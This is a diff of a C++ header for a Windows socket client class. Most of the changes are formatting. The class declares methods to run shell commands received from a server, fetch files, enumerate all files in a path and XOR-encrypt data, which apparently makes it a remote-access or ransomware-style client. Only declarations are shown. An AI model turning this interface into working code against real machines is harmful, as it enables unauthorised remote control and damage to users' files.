@@ -1,6 +1,7 @@
 //
 // Created by avita on 07/08/2020.
 //
+
 #define WIN32_LEAN_AND_MEAN
 
 
@@ -19,24 +20,21 @@
 #include<algorithm>
 #include <filesystem>
 
-
 #define BufferSize 1024
-
 
 #pragma warning(disable:4996)
 #pragma comment (lib, "Ws2_32.lib")
 
 using namespace std;
 
-
 class Connection {
     string ip;
     int port;
-    vector<filesystem::path>* files;
+    vector<filesystem::path> *files;
     SOCKET sock;
 
-public:
 
+public:
     //Initialize ip and string
     Connection(string ip, unsigned int port);
 
@@ -46,14 +44,14 @@ public:
     //Getting file from the server and save it in path
     void recvFile(string path);
 
-    //Sending message to the server
-    void sendMessage(const string message, SOCKET socket);
+    //Sending data to the server
+    void sendMessage(const char *data);
 
     //Getting command from the server
     void executeShell(string shell);
 
     //Saving all files in path
-    vector<filesystem::path>& getAllFiles(string path, vector<filesystem::path> files);
+    vector<filesystem::path> &getAllFiles(string path, vector<filesystem::path> files);
 
     //Encrypt data with xor encryption with key
     string encryptData(string data, string key);
@@ -69,7 +67,6 @@ public:
 
     //Creating the connection
     void connection();
-
 
 };
 
